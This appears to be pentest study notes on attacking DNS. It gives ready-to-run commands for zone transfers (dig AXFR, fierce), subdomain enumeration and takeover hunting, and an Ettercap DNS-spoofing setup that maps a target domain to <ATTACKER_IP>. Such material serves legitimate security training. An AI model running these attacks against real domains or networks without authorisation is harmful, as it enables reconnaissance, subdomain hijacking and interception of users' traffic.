# Attacking DNS

DNS on UDP/53 (TCP/53 for zone transfers and large responses).

---

## Zone Transfer

No auth required by default — dumps the entire DNS namespace if misconfigured:

```bash
dig AXFR @<NS_SERVER> <DOMAIN>
```

Automated with Fierce (also enumerates NS servers):

```bash
fierce --domain <DOMAIN>
```

Reveals internal hostnames, IPs, subdomains — massive attack surface expansion in one query.

---

## Subdomain Enumeration

Passive (scrapes OSINT sources):

```bash
subfinder -d <DOMAIN> -v
```

Active brute-force — useful internally with custom resolvers (no internet needed):

```bash
echo "<INTERNAL_NS>" > resolvers.txt
./subbrute.py <DOMAIN> -s ./names.txt -r resolvers.txt
```

Check CNAME records on found subdomains — hunt for dangling aliases:

```bash
host <SUBDOMAIN>.<DOMAIN>
```

`NoSuchBucket` / `There is no app configured` response = likely takeable. Cross-reference with `can-i-take-over-xyz` repo.

---

## DNS Cache Poisoning (Local Network)

Edit Ettercap's DNS spoof map:

```bash
# /etc/ettercap/etter.dns
<TARGET_DOMAIN>    A   <ATTACKER_IP>
*.<TARGET_DOMAIN>  A   <ATTACKER_IP>
```

Run Ettercap → Hosts → Scan → add target to Target1, gateway to Target2 → Plugins → `dns_spoof`. Victims resolving the target domain get your IP instead.

> [!warning] DNS spoofing via Ettercap requires LAN access and MITM position between the target and gateway. Not useful externally.

> [!tip] Zone transfer is always worth trying before doing anything else — if it works, you get the full internal DNS map for free. Try all NS servers, not just the primary.